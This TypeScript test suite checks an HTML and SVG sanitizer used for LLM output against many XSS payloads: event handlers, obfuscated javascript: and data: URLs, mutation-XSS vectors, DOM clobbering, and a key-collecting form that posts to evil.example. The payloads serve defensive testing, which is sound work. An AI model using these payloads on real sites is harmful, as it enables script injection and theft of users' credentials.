// Copyright 2025-2026 Hanlian Lu. SPDX-License-Identifier: Apache-2.0
/** Payload tests for the one HTML sink and the Mermaid SVG pass (lib/safe-html.ts).
 *
 * Each case names a payload, the part of it that must be gone, and the legitimate part that must
 * survive: a sanitizer that removes everything passes the first half alone. Every sanitized output
 * is also held to the same invariants, so a payload that slips a new route fails them whatever its
 * own case asserts. The tests live in the browser suite because DOMPurify needs a real DOM. */

import {expect} from '@esm-bundle/chai';
import {sanitizeSvg, setSanitizedLlmHtml} from '../lib/safe-html.ts';

interface Payload {
  name: string;
  html: string;
  /** Selectors that must match nothing in the output. */
  gone?: string[];
  /** Selectors that must still match: the safe part of the payload survives. */
  kept?: string[];
}

const SCRIPT_URL = /^(?:javascript|vbscript):/;
// Elements whose data: URL the browser reads as media bytes, never as a document to run.
const MEDIA_ELEMENTS = new Set(['IMG', 'IMAGE', 'VIDEO', 'AUDIO', 'SOURCE', 'TRACK']);
const NEVER_ELEMENTS = [
  'script', 'iframe', 'frame', 'frameset', 'object', 'embed', 'applet', 'base', 'meta', 'link',
  'form', 'input', 'textarea', 'select', 'style', 'foreignObject', 'math',
];

/** What the browser compares a URL attribute as: control characters and spaces dropped, lower case. */
function normalizedUrl(value: string): string {
  return Array.from(value).filter((char) => char.charCodeAt(0) > 0x20).join('').toLowerCase();
}

/** What no sanitized output may hold, whatever the payload was. */
function expectInert(root: Element): void {
  for (const tag of NEVER_ELEMENTS) {
    expect(root.querySelectorAll(tag), `<${tag}> element`).to.have.length(0);
  }
  for (const element of root.querySelectorAll('*')) {
    for (const attribute of element.attributes) {
      const where = `<${element.localName} ${attribute.name}>`;
      expect(attribute.name.startsWith('on'), `${where} is an event handler`).to.equal(false);
      expect(['style', 'srcdoc', 'formaction', 'action'], `${where} is forbidden`)
        .to.not.include(attribute.name);
      const value = normalizedUrl(attribute.value);
      if (['href', 'src', 'xlink:href', 'poster', 'data'].includes(attribute.name)) {
        expect(SCRIPT_URL.test(value), `${where} runs script: ${attribute.value}`).to.equal(false);
        if (value.startsWith('data:')) {
          expect(MEDIA_ELEMENTS.has(element.tagName.toUpperCase()), `${where} holds a data: document`)
            .to.equal(true);
        }
      }
    }
  }
}

// An element of a document that has no browsing context: the payload's images and frames never load.
function inertHost(): HTMLElement {
  return document.implementation.createHTMLDocument('').createElement('div');
}

function sanitized(html: string): HTMLElement {
  const host = inertHost();
  setSanitizedLlmHtml(host, html);
  return host;
}

function check(root: Element, payload: Payload): void {
  expectInert(root);
  for (const selector of payload.gone ?? []) {
    expect(root.querySelectorAll(selector), `${selector} should be gone`).to.have.length(0);
  }
  for (const selector of payload.kept ?? []) {
    expect(root.querySelectorAll(selector).length, `${selector} should survive`).to.be.greaterThan(0);
  }
}

// ── The LLM profile (setSanitizedLlmHtml) ───────────────────────────────────────────────────

const EVENT_HANDLERS: Payload[] = [
  {
    name: 'img onerror',
    html: '<img src="/x.png" onerror="alert(1)">',
    gone: ['[onerror]'],
    kept: ['img[src="/x.png"]'],
  },
  {
    name: 'anchor onclick',
    html: '<a href="/x" onclick="alert(1)">x</a>',
    gone: ['[onclick]'],
    kept: ['a[href="/x"]'],
  },
  {
    name: 'paragraph onmouseover with mixed-case name',
    html: '<p OnMouseOver="alert(1)">x</p>',
    gone: ['[onmouseover]'],
    kept: ['p'],
  },
  {
    name: 'svg onload',
    html: '<svg onload="alert(1)"><circle r="1"/></svg>',
    gone: ['[onload]'],
    kept: ['svg circle'],
  },
  {
    name: 'details ontoggle',
    html: '<details open ontoggle="alert(1)"><summary>s</summary>d</details>',
    gone: ['[ontoggle]'],
    kept: ['details[open] summary'],
  },
  {
    name: 'autofocus input onfocus',
    html: '<input autofocus onfocus="alert(1)"><p>after</p>',
    gone: ['input', '[onfocus]'],
    kept: ['p'],
  },
  {
    name: 'video onerror with a script source',
    html: '<video src="javascript:alert(1)" onerror="alert(1)"></video><p>after</p>',
    gone: ['[onerror]', '[src]'],
    kept: ['video', 'p'],
  },
];

// One scheme, written the ways a browser still reads as that scheme.
const SCRIPT_SCHEMES: Array<[string, string]> = [
  ['plain', 'javascript:alert(1)'],
  ['mixed case', 'JaVaScRiPt:alert(1)'],
  ['leading whitespace', '  javascript:alert(1)'],
  ['leading control character', '\u0001javascript:alert(1)'],
  ['tab inside the scheme', 'java\tscript:alert(1)'],
  ['newline entity inside the scheme', 'java&#x0A;script:alert(1)'],
  ['numeric entity for a letter', '&#106;avascript:alert(1)'],
  ['named entity for the colon', 'javascript&colon;alert(1)'],
  ['vbscript', 'vbscript:msgbox(1)'],
  ['mixed-case vbscript', 'VBScript:msgbox(1)'],
];

const DOCUMENT_SCHEMES: Array<[string, string]> = [
  ['data html', 'data:text/html,<script>alert(1)</script>'],
  ['data html, base64', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
  ['data html in mixed case', 'DaTa:text/html,<script>alert(1)</script>'],
  ['data svg', 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'],
];

const LINK_PAYLOADS: Payload[] = [
  ...[...SCRIPT_SCHEMES, ...DOCUMENT_SCHEMES].map(([name, url]): Payload => ({
    name: `a[href] ${name}`,
    html: `<a href="${url}">label</a>`,
    gone: ['[href]'],
    kept: ['a'],
  })),
  ...SCRIPT_SCHEMES.map(([name, url]): Payload => ({
    name: `img[src] ${name}`,
    html: `<img src="${url}" alt="chart">`,
    gone: ['[src]'],
    kept: ['img[alt="chart"]'],
  })),
  {
    name: 'svg anchor with xlink:href',
    html: '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
    kept: ['svg a text'],
  },
  {
    name: 'svg anchor with href',
    html: '<svg><a href="javascript:alert(1)"><text>x</text></a></svg>',
    gone: ['a[href]'],
    kept: ['svg a text'],
  },
  {
    name: 'svg anchor with a data document',
    html: '<svg><a xlink:href="data:text/html,<script>alert(1)</script>"><text>x</text></a></svg>',
    kept: ['svg a text'],
  },
  {
    name: 'svg image with a script source',
    html: '<svg><image href="javascript:alert(1)"/></svg>',
    gone: ['image[href]'],
  },
  {
    name: 'img srcset with a script candidate',
    html: '<img srcset="javascript:alert(1) 1x, /x.png 2x" alt="a">',
    gone: ['[srcset]'],
    kept: ['img'],
  },
  {
    name: 'video poster with a script source',
    html: '<video controls src="/v.mp4" poster="javascript:alert(1)"></video>',
    gone: ['[poster]'],
    kept: ['video[src="/v.mp4"]'],
  },
];

const ACTIVE_CONTENT: Payload[] = [
  {
    name: 'script element',
    html: '<script>alert(1)</script><p>after</p>',
    gone: ['script'],
    kept: ['p'],
  },
  {
    name: 'script inside svg',
    html: '<svg><script>alert(1)</script><circle r="1"/></svg>',
    gone: ['script'],
    kept: ['svg circle'],
  },
  {
    name: 'foreignObject holding an iframe',
    html: '<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>',
    gone: ['foreignObject', 'iframe'],
    kept: ['svg'],
  },
  {
    name: 'foreignObject holding HTML',
    html: '<svg><foreignObject><p>smuggled</p></foreignObject><text>kept</text></svg>',
    gone: ['foreignObject'],
    kept: ['svg text'],
  },
  {
    name: 'iframe with a source',
    html: '<iframe src="/x"></iframe><p>after</p>',
    gone: ['iframe'],
    kept: ['p'],
  },
  {
    name: 'iframe with srcdoc',
    html: '<iframe srcdoc="<script>alert(1)</script>"></iframe><p>after</p>',
    gone: ['iframe', '[srcdoc]'],
    kept: ['p'],
  },
  {
    name: 'object and embed',
    html: '<object data="/x.swf"></object><embed src="/x.swf"><p>after</p>',
    gone: ['object', 'embed', '[data]'],
    kept: ['p'],
  },
  {
    name: 'svg use pointing at a data document',
    html: '<svg><use href="data:image/svg+xml,<svg id=a xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#a"/></svg>',
    gone: ['use'],
  },
  {
    name: 'svg animation that sets a script href',
    html: '<svg><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="onmouseover" to="alert(1)"/></svg>',
    gone: ['animate', 'set'],
  },
  {
    name: 'MathML with a script link',
    html: '<math><mi xlink:href="javascript:alert(1)">x</mi></math><p>after</p>',
    gone: ['math'],
    kept: ['p'],
  },
  {
    name: 'template holding a script',
    html: '<template><script>alert(1)</script></template><p>after</p>',
    gone: ['template', 'script'],
    kept: ['p'],
  },
  {
    name: 'base, meta refresh and stylesheet link',
    html: '<base href="//evil.example/"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
      + '<link rel="stylesheet" href="//evil.example/x.css"><a href="next">next</a>',
    gone: ['base', 'meta', 'link'],
    kept: ['a[href="next"]'],
  },
  {
    name: 'noscript that closes itself in an attribute',
    html: '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
    gone: ['[onerror]'],
  },
  {
    name: 'mutation vector: svg, paragraph and style',
    html: '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
    gone: ['[onerror]', 'style'],
  },
  {
    name: 'mutation vector: nested forms across namespaces',
    html: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
    gone: ['[onerror]', 'style', 'math'],
  },
  {
    name: 'mutation vector: comment inside a table in MathML',
    html: '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    gone: ['[onerror]', 'style'],
  },
];

const STYLE_AND_FORMS: Payload[] = [
  {
    name: 'style element after content',
    html: '<p>x</p><style>body{display:none}</style>',
    gone: ['style'],
    kept: ['p'],
  },
  {
    name: 'style element before content',
    html: '<style>@import url(//evil.example/x.css);</style><p>x</p>',
    gone: ['style'],
    kept: ['p'],
  },
  {
    name: 'style element inside an inline svg, which styles the whole document',
    html: '<p>x</p><svg><style>body{display:none}</style><circle r="1"/></svg>',
    gone: ['style'],
    kept: ['p', 'svg circle'],
  },
  {
    name: 'style attribute that overlays the page',
    html: '<p style="position:fixed;inset:0;background:url(//evil.example/p)">x</p>',
    gone: ['[style]'],
    kept: ['p'],
  },
  {
    name: 'form with controls that posts elsewhere',
    html: '<form action="https://evil.example/collect" method="post"><p>Enter your key</p>'
      + '<input name="key"><textarea>t</textarea><select><option>o</option></select></form>',
    gone: ['form', 'input', 'textarea', 'select', 'option', '[action]', '[method]'],
    kept: ['p'],
  },
  {
    name: 'button formaction',
    html: '<button type="submit" formaction="javascript:alert(1)" form="f">go</button><p>after</p>',
    gone: ['[formaction]', '[form]'],
    kept: ['p'],
  },
  {
    name: 'id that would shadow an id the application looks up',
    html: '<p id="theme-menu" class="note" title="t" lang="zh">x</p>',
    gone: ['[id]'],
    kept: ['p.note[title="t"][lang="zh"]'],
  },
  {
    name: 'name that would clobber a document property',
    html: '<img name="getElementById" alt="a"><p name="cookie">x</p>',
    gone: ['[name]'],
    kept: ['img', 'p'],
  },
];

// Links that point away from the page are ordinary content: the sanitizer keeps them, and the
// URL helpers and link hardening (lib/urls.ts, ui/rich-rendering.ts) decide what they may reach.
const ORDINARY_LINKS: Payload[] = [
  {
    name: 'protocol-relative link',
    html: '<a href="//evil.example/path">x</a>',
    kept: ['a[href="//evil.example/path"]'],
  },
  {
    name: 'backslash link',
    html: '<a href="\\\\evil.example\\path">x</a><a href="/\\evil.example">y</a>',
    kept: ['a'],
  },
  {
    name: 'https, relative, fragment and mailto links',
    html: '<a href="https://example.com/a?b=1#c">a</a><a href="/web/x?y=1#z">b</a>'
      + '<a href="#frag">c</a><a href="mailto:a@example.com">d</a><a href=" https://example.com">e</a>',
    kept: [
      'a[href="https://example.com/a?b=1#c"]',
      'a[href="/web/x?y=1#z"]',
      'a[href="#frag"]',
      'a[href="mailto:a@example.com"]',
      'a[href="https://example.com"]',
    ],
  },
  {
    name: 'img with an inline PNG',
    html: '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot">',
    kept: ['img[src^="data:image/png;base64,"]'],
  },
  {
    name: 'img with a data document is only an image element',
    html: '<img src="data:text/html;base64,PHNjcmlwdD4=" alt="x">',
    kept: ['img'],
  },
];

const LEGITIMATE_CONTENT: Payload[] = [
  {
    name: 'a citation keeps its identity data and accessible name',
    html: '<sup><a href="#c1" data-chunk="3" data-ref="1" data-evil="x" aria-label="Source 1"'
      + ' role="doc-noteref" tabindex="0">[1]</a></sup>',
    gone: ['[data-evil]'],
    kept: [
      'a[data-chunk="3"][data-ref="1"][aria-label="Source 1"][role="doc-noteref"][tabindex="0"]',
    ],
  },
  {
    name: 'a download link keeps its download attribute',
    html: '<a href="/web/files/1" download="report.md">report</a>',
    kept: ['a[href="/web/files/1"][download="report.md"]'],
  },
  {
    name: 'hidden content stays hidden',
    html: '<div hidden>later</div>',
    kept: ['div[hidden]'],
  },
  {
    name: 'a Mermaid fence keeps its class and code',
    html: '<pre class="mermaid-source" data-lang="mermaid"><code>graph TD;\nA--&gt;B;</code></pre>',
    kept: ['pre.mermaid-source code'],
  },
  {
    name: 'highlighted code keeps its token classes',
    html: '<pre class="highlight"><code><span class="k">def</span> <span class="nf">f</span></code></pre>',
    kept: ['pre.highlight span.k', 'span.nf'],
  },
  {
    name: 'a table keeps its structure and spans',
    html: '<table><thead><tr><th scope="col" colspan="2">h</th></tr></thead>'
      + '<tbody><tr><td rowspan="2">a</td><td>b</td></tr></tbody></table>',
    kept: ['table thead th[scope="col"][colspan="2"]', 'tbody td[rowspan="2"]'],
  },
  {
    name: 'an inline icon keeps its geometry and stroke attributes',
    html: '<svg viewBox="0 0 24 24"><path d="M12 3v12" stroke="currentColor" stroke-width="2"'
      + ' stroke-linecap="round" stroke-linejoin="round"/><line x1="0" y1="0" x2="10" y2="10"/>'
      + '<polyline points="0,0 5,5"/></svg>',
    kept: [
      'svg[viewBox="0 0 24 24"]',
      'path[d="M12 3v12"][stroke-width="2"][stroke-linecap="round"][stroke-linejoin="round"]',
      'line[x1="0"][y2="10"]',
      'polyline[points="0,0 5,5"]',
    ],
  },
  {
    name: 'plain structure and text',
    html: '<h2>Title</h2><p>One <strong>two</strong> <em>three</em> <code>four</code></p>'
      + '<ul><li>a</li></ul><blockquote>q</blockquote><hr>',
    kept: ['h2', 'p strong', 'p em', 'p code', 'ul li', 'blockquote', 'hr'],
  },
];

const LLM_PAYLOADS: Array<[string, Payload[]]> = [
  ['event handlers', EVENT_HANDLERS],
  ['script URLs and documents', LINK_PAYLOADS],
  ['active content', ACTIVE_CONTENT],
  ['style and forms', STYLE_AND_FORMS],
  ['ordinary links and images', ORDINARY_LINKS],
  ['legitimate content', LEGITIMATE_CONTENT],
];

describe('setSanitizedLlmHtml', () => {
  for (const [group, payloads] of LLM_PAYLOADS) {
    describe(group, () => {
      for (const payload of payloads) {
        it(payload.name, () => {
          check(sanitized(payload.html), payload);
        });
      }
    });
  }

  it('replaces whatever the element held and sanitizes once', () => {
    const host = inertHost();
    host.innerHTML = '<p onclick="alert(1)">old</p>';

    setSanitizedLlmHtml(host, '<p>new</p>');

    expect(host.innerHTML).to.equal('<p>new</p>');
  });

  it('keeps the text of a form it removes, so an answer that quotes one still reads', () => {
    const host = sanitized('<form action="/x"><p>Enter your key</p><input name="k"></form>');

    expect(host.textContent).to.equal('Enter your key');
  });

  it('leaves no script scheme in any href or src of a payload built from every spelling', () => {
    const everything = [...SCRIPT_SCHEMES, ...DOCUMENT_SCHEMES]
      .map(([, url]) => `<a href="${url}">a</a><img src="${url}"><svg><a xlink:href="${url}"/></svg>`)
      .join('');

    expectInert(sanitized(everything));
  });
});

// ── The Mermaid SVG profile (sanitizeSvg) ───────────────────────────────────────────────────

function parsedSvg(svg: string): Element {
  const host = inertHost();
  host.innerHTML = sanitizeSvg(svg);
  return host;
}

const SVG_NS = 'xmlns="http://www.w3.org/2000/svg"';

// The SVG becomes an <img>, so its own <style> is scoped to it and stays: Mermaid bakes its theme
// colours there. What must go is anything that runs or embeds a document.
const SVG_PAYLOADS: Payload[] = [
  {
    name: 'script element',
    html: `<svg ${SVG_NS}><script>alert(1)</script><text>kept</text></svg>`,
    gone: ['script'],
    kept: ['svg text'],
  },
  {
    name: 'foreignObject holding HTML',
    html: `<svg ${SVG_NS}><foreignObject><p>smuggled</p><iframe src="/x"></iframe></foreignObject><text>kept</text></svg>`,
    gone: ['foreignObject', 'p', 'iframe'],
    kept: ['svg text'],
  },
  {
    name: 'foreignObject with a handler inside a switch',
    html: `<svg ${SVG_NS}><switch><foreignObject><body onload="alert(1)"/></foreignObject><text>fallback</text></switch></svg>`,
    gone: ['foreignObject', 'body', '[onload]'],
    kept: ['switch text'],
  },
  {
    name: 'event handlers on the root and on a child',
    html: `<svg ${SVG_NS} onload="alert(1)"><text onclick="alert(1)">x</text></svg>`,
    gone: ['[onload]', '[onclick]'],
    kept: ['svg text'],
  },
  {
    name: 'anchor with xlink:href',
    html: `<svg ${SVG_NS}><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
    kept: ['svg a text'],
  },
  {
    name: 'anchor with href',
    html: `<svg ${SVG_NS}><a href="javascript:alert(1)"><text>x</text></a></svg>`,
    gone: ['a[href]'],
    kept: ['svg a text'],
  },
  {
    name: 'image with a script source',
    html: `<svg ${SVG_NS}><image href="javascript:alert(1)"/><text>x</text></svg>`,
    gone: ['image[href]'],
    kept: ['svg text'],
  },
  {
    name: 'animation that sets a handler',
    html: `<svg ${SVG_NS}><animate attributeName="href" values="javascript:alert(1)"/><set attributeName="onclick" to="alert(1)"/><text>x</text></svg>`,
    gone: ['animate', 'set'],
    kept: ['svg text'],
  },
  {
    name: 'iframe, object and embed',
    html: `<svg ${SVG_NS}><text>x</text><iframe src="/x"></iframe><object data="/x"></object><embed src="/x"></svg>`,
    gone: ['iframe', 'object', 'embed'],
    kept: ['svg text'],
  },
  {
    name: 'a scoped style element, which Mermaid needs for its theme',
    html: `<svg ${SVG_NS}><style>.node rect{fill:#ececff}</style><g class="node"><rect/></g></svg>`,
    kept: ['svg style', 'g.node rect'],
  },
  {
    name: 'presentation, transform, marker and filter attributes',
    html: `<svg ${SVG_NS}><defs><marker id="m"><path d="M0 0"/></marker><filter id="f"><feGaussianBlur stdDeviation="1"/></filter></defs>`
      + '<g style="fill:red" transform="translate(1,2)" filter="url(#f)"><path d="M0 0" marker-end="url(#m)"/>'
      + '<text x="1" y="2" class="label">label</text></g></svg>',
    kept: [
      'defs marker#m path',
      'defs filter#f feGaussianBlur',
      'g[style="fill:red"][transform="translate(1,2)"][filter="url(#f)"]',
      'path[marker-end="url(#m)"]',
      'text.label[x="1"][y="2"]',
    ],
  },
  {
    name: 'title and description for assistive technology',
    html: `<svg ${SVG_NS}><title>T</title><desc>D</desc><text>x</text></svg>`,
    kept: ['svg title', 'svg desc', 'svg text'],
  },
];

describe('sanitizeSvg', () => {
  for (const payload of SVG_PAYLOADS) {
    it(payload.name, () => {
      const root = parsedSvg(payload.html);
      for (const tag of ['script', 'foreignObject', 'iframe', 'object', 'embed']) {
        expect(root.querySelectorAll(tag), `<${tag}> element`).to.have.length(0);
      }
      for (const element of root.querySelectorAll('*')) {
        for (const attribute of element.attributes) {
          expect(attribute.name.startsWith('on'), `${element.localName} ${attribute.name}`).to.equal(false);
          expect(SCRIPT_URL.test(normalizedUrl(attribute.value)), `${attribute.name}=${attribute.value}`)
            .to.equal(false);
        }
      }
      for (const selector of payload.gone ?? []) {
        expect(root.querySelectorAll(selector), `${selector} should be gone`).to.have.length(0);
      }
      for (const selector of payload.kept ?? []) {
        expect(root.querySelectorAll(selector).length, `${selector} should survive`).to.be.greaterThan(0);
      }
    });
  }

  it('returns markup that is still an svg document root', () => {
    const output = sanitizeSvg(`<svg ${SVG_NS} viewBox="0 0 10 10"><text>x</text></svg>`);

    expect(output.startsWith('<svg')).to.equal(true);
    expect(output).to.contain('viewBox="0 0 10 10"');
  });
});
